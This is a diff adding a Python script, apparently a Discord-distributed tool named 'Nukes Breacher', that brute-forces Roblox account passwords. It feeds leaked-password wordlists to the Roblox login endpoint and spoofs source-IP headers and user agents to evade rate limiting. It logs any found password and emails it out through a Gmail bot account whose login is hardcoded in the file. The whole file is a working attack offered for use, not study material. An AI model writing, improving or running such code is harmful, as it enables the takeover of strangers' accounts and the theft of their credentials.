@@ -1,0 +1,192 @@
+import requests
+import time
+import random
+from datetime import datetime
+from tqdm import tqdm
+from colorama import Fore, Style, init
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+init(autoreset=True)
+
+user_agents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'
+]
+
+ip_addresses = [
+    '127.0.0.1',
+    '192.168.1.1',
+    '10.0.0.1',
+    '172.16.0.1',
+    '8.8.8.8',
+    '8.8.4.4',
+    '1.1.1.1',
+    '9.9.9.9',
+    '104.16.54.23',
+    '178.32.56.72'
+]
+
+rainbow_colors = [
+    Fore.RED,
+    Fore.YELLOW,
+    Fore.GREEN,
+    Fore.CYAN,
+    Fore.BLUE,
+    Fore.MAGENTA
+]
+
+ascii_art = """
+  _   _   _    _   _  __  ______    _____     ____    _____    ______               _____   _    _   ______   _____              __ 
+ | \ | | | |  | | | |/ / |  ____|  / ____|   |  _ \  |  __ \  |  ____|     /\      / ____| | |  | | |  ____| |  __ \            /_ |
+ |  \| | | |  | | | ' /  | |__    | (___     | |_) | | |__) | | |__       /  \    | |      | |__| | | |__    | |__) |   __   __  | |
+ | .  | | |  | | |  <   |  __|    \___ \    |  _ <  |  _  /  |  __|     / /\ \   | |      |  __  | |  __|   |  _  /    \ \ / /  | |
+ | |\  | | |__| | | . \  | |____   ____) |   | |_) | | | \ \  | |____   / ____ \  | |____  | |  | | | |____  | | \ \     \ V /   | |
+ |_| \_|  \____/  |_|\_\ |______| |_____/    |____/  |_|  \_\ |______| /_/    \_\  \_____| |_|  |_| |______| |_|  \_\     \_/    |_|
+                                                                                                                                    
+                                                                                                                                    
+   __  _____            _       _                               _   _   _     _                  __                                 
+  / / |  __ \          | |     | |                             | | (_) | |   (_)                 \ \                                
+ | |  | |__) |   ___   | |__   | |   ___   __  __     ___    __| |  _  | |_   _    ___    _ __    | |                               
+ | |  |  _  /   / _ \  | '_ \  | |  / _ \  \ \/ /    / _ \  / _ | | | | __| | |  / _ \  | '_ \   | |                               
+ | |  | | \ \  | (_) | | |_) | | | | (_) |  >  <    |  __/ | (_| | | | | |_  | | | (_) | | | | |  | |                               
+ | |  |_|  \_\  \___/  |_.__/  |_|  \___/  /_/\_\    \___|  \__,_| |_|  \__| |_|  \___/  |_| |_|  | |                               
+  \_\                                                                                            /_/                                
+                                                                                                                                    
+
+
+Credits: iNukedYou on Discord
+Version: v1
+Contact me on Discord with any other site recommendations!
+"""
+
+for i, line in enumerate(ascii_art.splitlines()):
+    color = rainbow_colors[i % len(rainbow_colors)]
+    print(color + line)
+    time.sleep(2)
+
+print(Style.RESET_ALL)
+
+def send_email(success, username, password, receiver_email):
+    sender_email = 'nbreacherbot@gmail.com'
+    subject = "Brute Force Notification"
+    body = f"Success: {success}\nUsername: {username}\nPassword: {password}"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body, 'plain'))
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, 'breacherbot!1') #Dont even try ;)
+            text = msg.as_string()
+            server.sendmail(sender_email, receiver_email, text)
+        print(f"\n[INFO] Email sent to {receiver_email}")
+    except Exception as e:
+        print(f"[ERROR] Failed to send email: {e}")
+
+def read_passwords(file_path):
+    with open(file_path, 'r') as file:
+        passwords = file.readlines()
+    return [password.strip() for password in passwords]
+
+def attempt_login(username, password, user_agent, ip_address, token=None, cookie=None):
+    url = 'https://www.roblox.com/newlogin'
+    headers = {
+        'User-Agent': user_agent,
+        'X-Forwarded-For': ip_address,
+        'X-Originating-IP': ip_address,
+        'X-Remote-IP': ip_address,
+        'X-Remote-Addr': ip_address,
+        'X-Client-IP': ip_address,
+    }
+    if token:
+        headers['Authorization'] = f'Bearer {token}'
+    if cookie:
+        headers['Cookie'] = cookie
+
+    data = {
+        'ctype': 'Username',
+        'cvalue': username,
+        'password': password
+    }
+
+    try:
+        response = requests.post(url, headers=headers, data=data, timeout=10)
+        return response
+    except requests.RequestException as e:
+        print(f"[ERROR] Request failed: {e}")
+        return None
+
+def log_attempt(username, password, success, retries=0):
+    with open('login_attempts.log', 'a') as log_file:
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        log_file.write(f"{timestamp} - Username: {username}, Password: {password}, Success: {success}, Retries: {retries}\n")
+
+def track_passwords_per_minute(start_time, total_attempts):
+    elapsed_time = time.time() - start_time
+    passwords_per_minute = total_attempts / (elapsed_time / 60)
+    print(f"\n[INFO] {total_attempts} attempts made ({passwords_per_minute:.2f} passwords/min)\n")
+
+def estimate_time_left(total_attempts, passwords, start_time):
+    attempts_left = sum(len(read_passwords(f)) for f in passwords) - total_attempts
+    if total_attempts == 0:
+        return
+    elapsed_time = time.time() - start_time
+    estimated_time = (elapsed_time / total_attempts) * attempts_left
+    print(f"Estimated time left: {estimated_time / 60:.2f} minutes")
+
+def brute_force(username, password_files, token=None, cookie=None, email_updates=None):
+    total_attempts = 0
+    start_time = time.time()
+    for password_file in password_files:
+        passwords = read_passwords(password_file)
+        if not passwords:
+            continue
+
+        for password in passwords:
+            user_agent = random.choice(user_agents)
+            ip_address = random.choice(ip_addresses)
+            response = attempt_login(username, password, user_agent, ip_address, token, cookie)
+
+            total_attempts += 1
+            if response and 'X-CSRF-Token' in response.headers:
+                print(f"Password found: {password}")
+                log_attempt(username, password, True)
+                track_passwords_per_minute(start_time, total_attempts)
+                if email_updates:
+                    send_email(True, username, password, email_updates)
+                return
+            else:
+                print(f"Trying password: {password}")
+                log_attempt(username, password, False)
+
+            if total_attempts % 10 == 0:
+                track_passwords_per_minute(start_time, total_attempts)
+                estimate_time_left(total_attempts, passwords, start_time)
+
+            time.sleep(random.uniform(1, 3))
+
+    if email_updates:
+        send_email(False, username, 'None', email_updates)
+
+if __name__ == "__main__":
+    print(ascii_art)
+    username = input("Enter the username: ")
+    token = input("Enter Bearer Token (if applicable, press Enter to skip): ")
+    cookie = input("Enter Cookie (if applicable, press Enter to skip): ")
+
+    email_choice = input("Do you want email updates? (midway/end/none): ").lower()
+    email_updates = None
+    if email_choice in ['midway', 'end']:
+        email_updates = input("Enter your email to receive notifications: ")
+
+    password_files = ['darkweb2017-top10000.txt', 'fortinet-2021_passwords.txt']
+    brute_force(username, password_files, token if token else None, cookie if cookie else None, email_updates)
